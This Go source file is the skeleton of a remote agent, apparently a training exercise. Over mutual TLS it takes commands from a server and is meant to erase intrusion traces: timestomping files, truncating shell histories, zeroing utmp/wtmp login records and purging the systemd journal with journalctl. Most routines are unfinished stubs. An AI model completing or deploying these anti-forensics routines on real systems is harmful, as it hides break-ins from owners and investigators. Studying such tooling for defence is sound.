package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
)

//go:embed certs/ca.crt
var caCert []byte

//go:embed certs/agent.crt
var agentCert []byte

//go:embed certs/agent.key
var agentKey []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

// utmpRecordSize is the size of a utmp/utmpx record on Linux amd64.
const utmpRecordSize = 384

// utmpUserOffset is the byte offset of ut_user in the record.
const utmpUserOffset = 44

// utmpUserLen is the maximum length of ut_user (including null terminator).
const utmpUserLen = 256

func main() {
	conn := dial()
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "PING":
			fmt.Fprintln(conn, "PONG")
		case "CLEANUP":
			err := cleanup(arg)
			if err != nil {
				fmt.Fprintf(conn, "ERR %v\n", err)
			} else {
				fmt.Fprintln(conn, "OK")
			}
		case "TIMESTOMP":
			// arg = "target reference"
			files := strings.SplitN(arg, " ", 2)
			if len(files) != 2 {
				fmt.Fprintln(conn, "ERR need target and reference paths")
				continue
			}
			err := timestomp(files[0], files[1])
			if err != nil {
				fmt.Fprintf(conn, "ERR %v\n", err)
			} else {
				fmt.Fprintln(conn, "OK")
			}
		default:
			fmt.Fprintf(conn, "ERR unknown command: %s\n", cmd)
		}
	}
}

// dial establishes an mTLS connection to the server.
func dial() *tls.Conn {
	cert, err := tls.X509KeyPair(agentCert, agentKey)
	if err != nil {
		log.Fatalf("load agent cert: %v", err)
	}

	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caCert)

	conn, err := tls.Dial("tcp", serverAddr, &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS13,
	})
	if err != nil {
		log.Fatalf("dial: %v", err)
	}
	return conn
}

// timestomp copies the mtime from reference to target, making the target
// blend in with surrounding files.
func timestomp(target, reference string) error {
	// TODO: stat the reference file, apply its times to target with os.Chtimes
	return nil
}

// clearHistory truncates common shell history files.
func clearHistory(username string) error {
	paths := []string{
		os.Getenv("HOME") + "/.bash_history",
		os.Getenv("HOME") + "/.zsh_history",
		os.Getenv("HOME") + "/.history",
		"/root/.bash_history",
	}
	// TODO: truncate root, current-user, and /home/<username> history files
	_ = paths
	return nil
}

// scrubUtmp removes login records for username from utmp and wtmp.
// Each record is utmpRecordSize bytes. Walk the file, zero records
// where ut_user matches username.
func scrubUtmp(username string) error {
	files := []string{"/var/run/utmp", "/var/log/wtmp"}
	_ = files
	_ = username
	// TODO: zero matching utmp and wtmp records in place
	return nil
}

// tamperJournal vacuums the systemd journal and rotates the active file.
func tamperJournal() error {
	// TODO: run journalctl --vacuum-time=1s to purge archived journals
	// TODO: send SIGUSR2 to systemd-journald to rotate the active journal
	return nil
}

// cleanup orchestrates all anti-forensics routines.
// username is the login name to scrub from utmp/wtmp.
// If empty, defaults to the current user.
func cleanup(username string) error {
	if username == "" {
		username = os.Getenv("USER")
	}

	// TODO: call timestomp on the agent binary itself (use /etc/hostname as reference)
	// TODO: call clearHistory(username)
	// TODO: call scrubUtmp(username)
	// TODO: call tamperJournal
	// TODO: call os.Clearenv to wipe the process environment

	return nil
}

// extractUser reads the ut_user field from a utmp record buffer.
func extractUser(record []byte) string {
	if len(record) < utmpUserOffset+utmpUserLen {
		return ""
	}
	raw := record[utmpUserOffset : utmpUserOffset+utmpUserLen]
	end := bytes.IndexByte(raw, 0)
	if end < 0 {
		end = utmpUserLen
	}
	return string(raw[:end])
}

// Ensure imports are used.
var _ = io.ReadFull
var _ = exec.Command
var _ = fmt.Fprintln
